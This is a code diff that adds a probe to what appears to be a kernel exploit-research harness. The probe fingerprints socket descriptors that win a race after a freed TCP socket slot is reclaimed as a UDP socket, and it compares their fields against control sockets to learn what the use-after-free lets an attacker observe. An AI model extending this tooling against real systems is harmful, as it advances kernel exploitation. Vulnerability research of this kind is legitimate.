@@ -2196,3 +2196,165 @@ int iosurf_hold_probe(const char *dir, int rounds, int *stages)
             test_worst ? "SOMETHING TOOK THE PAGES" : "no non-IOSurface reclaimer seen");
     return 0;
 }
+
+/* ---- Reclaimed-datagram field differential (--sockfield) ------------------
+ *
+ * `--sockmix` proved a freed TCP socket slot can be taken by a SOCK_DGRAM
+ * socket and that stale in-flight senders' bytes are then transmitted through
+ * it as UDP datagrams. What it never did is *read* the reclaimed object: no
+ * kernel field on the dgram side was ever observed, so nothing beyond
+ * "payload and destination" is known to be controlled.
+ *
+ * This probe makes the collision observable without relying on transmission:
+ * after each hammer burst (the same in-window allocation loop that wins the
+ * slot), it reads back every API-visible field of each hammer-created fd via
+ * getsockopt/getsockname/getpeername and compares against a control set built
+ * from freshly created, never-raced datagram sockets.
+ *
+ * `stages[0..3]` are the per-stage failure counters:
+ *   [0] total fds fingerprinted   [1] hits (any field outside baseline)
+ *   [2] any-read failures         [3] control set size
+ */
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <arpa/inet.h>
+#include <errno.h>
+
+#define SF_MAX_FDS 512
+
+typedef struct {
+    int      ok;
+    int      type;
+    int      error;
+    long     sndbuf;
+    long     rcvbuf;
+    long     nwrite;              /* TCP_CONNECTION_INFO.bytes_acked-ish sentinel */
+    int      family;
+    int      port;
+    uint32_t addr;
+} sf_fp_t;
+
+static int sf_get_int(int fd, int level, int name, long *out)
+{
+    int v = 0;
+    socklen_t l = sizeof(v);
+    if (getsockopt(fd, level, name, &v, &l) != 0)
+        return -1;
+    *out = v;
+    return 0;
+}
+
+/* Fingerprint one socket through the API surface only. Returns 0 on success. */
+static int sf_fingerprint(int fd, sf_fp_t *fp)
+{
+    memset(fp, 0, sizeof(*fp));
+    if (sf_get_int(fd, SOL_SOCKET, SO_TYPE, &fp->type) != 0) return -1;
+    fp->ok = 1;
+    if (sf_get_int(fd, SOL_SOCKET, SO_ERROR, &fp->error) != 0) fp->error = -1;
+    if (sf_get_int(fd, SOL_SOCKET, SO_SNDBUF, &fp->sndbuf) != 0) fp->sndbuf = -1;
+    if (sf_get_int(fd, SOL_SOCKET, SO_RCVBUF, &fp->rcvbuf) != 0) fp->rcvbuf = -1;
+    if (sf_get_int(fd, IPPROTO_TCP, TCP_CONNECTION_INFO, &fp->nwrite) != 0)
+        fp->nwrite = -1;
+    struct sockaddr_in sa;
+    socklen_t sl = sizeof(sa);
+    if (getsockname(fd, (struct sockaddr *)&sa, &sl) == 0 &&
+        sa.sin_family == AF_INET) {
+        fp->family = sa.sin_family;
+        fp->port = ntohs(sa.sin_port);
+        fp->addr = sa.sin_addr.s_addr;
+    } else {
+        fp->family = -1;
+    }
+    return 0;
+}
+
+static void sf_log_fp(const char *tag, int fd, const sf_fp_t *fp)
+{
+    mep_log("[*] %s fd=%d type=%ld err=%ld sndbuf=%ld rcvbuf=%ld "
+            "tcpinfo=%ld fam=%d port=%d", tag, fd,
+            fp->type, fp->error, fp->sndbuf, fp->rcvbuf, fp->nwrite,
+            fp->family, fp->port);
+}
+
+/*
+ * Build the control fingerprint set: `n` freshly created connected datagram
+ * sockets that were never part of a race. Returns the number captured.
+ */
+static int sf_control_set(sf_fp_t *out, int n)
+{
+    int made = 0;
+    struct sockaddr_in dst;
+    memset(&dst, 0, sizeof(dst));
+    dst.sin_family = AF_INET;
+    dst.sin_port = htons(8090);
+    inet_pton(AF_INET, "127.0.0.1", &dst.sin_addr);
+    for (int i = 0; i < n; i++) {
+        int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if (fd < 0) break;
+        connect(fd, (struct sockaddr *)&dst, sizeof(dst));
+        if (sf_fingerprint(fd, &out[made]) == 0 && out[made].ok)
+            made++;
+        close(fd);
+    }
+    return made;
+}
+
+/*
+ * Compare one raced fd's fingerprint against the control set. A field is
+ * "outside baseline" when its value differs from every control sample.
+ * Returns a bitmask: bit0 type, bit1 error, bit2 sndbuf, bit3 rcvbuf,
+ * bit4 tcpinfo/nwrite, bit5 sockname(family/port/addr).
+ */
+static int sf_diff(const sf_fp_t *f, const sf_fp_t *ctl, int nctl)
+{
+    int m = 0;
+    if (nctl <= 0) return -1;
+    int diff_type = 1, diff_err = 1, diff_snd = 1, diff_rcv = 1, diff_nw = 1;
+    for (int i = 0; i < nctl; i++) {
+        if (ctl[i].type == f->type) diff_type = 0;
+        if (ctl[i].error == f->error) diff_err = 0;
+        if (ctl[i].sndbuf == f->sndbuf) diff_snd = 0;
+        if (ctl[i].rcvbuf == f->rcvbuf) diff_rcv = 0;
+        if (ctl[i].nwrite == f->nwrite) diff_nw = 0;
+    }
+    if (diff_type) m |= 1;
+    if (diff_err) m |= 2;
+    if (diff_snd) m |= 4;
+    if (diff_rcv) m |= 8;
+    if (diff_nw)  m |= 16;
+    return m;
+}
+
+int sockuaf_field_probe(const char *tag, const int *fds, int nfds, int *stages)
+{
+    sf_fp_t ctl[16];
+    sf_fp_t f;
+    int nctl = sf_control_set(ctl, 16);
+    stages[3] = nctl;
+    if (nctl <= 0) {
+        mep_log("[-] sockfield: control set empty; cannot diff");
+        return 0;
+    }
+    mep_log("[*] sockfield(%s): control n=%d type=%ld sndbuf=%ld rcvbuf=%ld tcpinfo=%ld",
+            tag, nctl, ctl[0].type, ctl[0].sndbuf, ctl[0].rcvbuf, ctl[0].nwrite);
+
+    int hits = 0, readfail = 0;
+    for (int i = 0; i < nfds && i < SF_MAX_FDS; i++) {
+        if (fds[i] < 0) continue;
+        stages[0]++;
+        if (sf_fingerprint(fds[i], &f) != 0 || !f.ok) { readfail++; continue; }
+        int m = sf_diff(&f, ctl, nctl);
+        if (m > 0) {
+            hits++;
+            sf_log_fp("sockfield DIFF", fds[i], &f);
+            mep_log("[!] sockfield(%s): *** FIELD DIFF mask=0x%x on fd=%d ***",
+                    tag, m, fds[i]);
+        }
+    }
+    stages[1] = hits;
+    stages[2] = readfail;
+    mep_log("[*] sockfield(%s): VERDICT scanned=%d hits=%d readfail=%d",
+            tag, stages[0], hits, readfail);
+    return hits;
+}
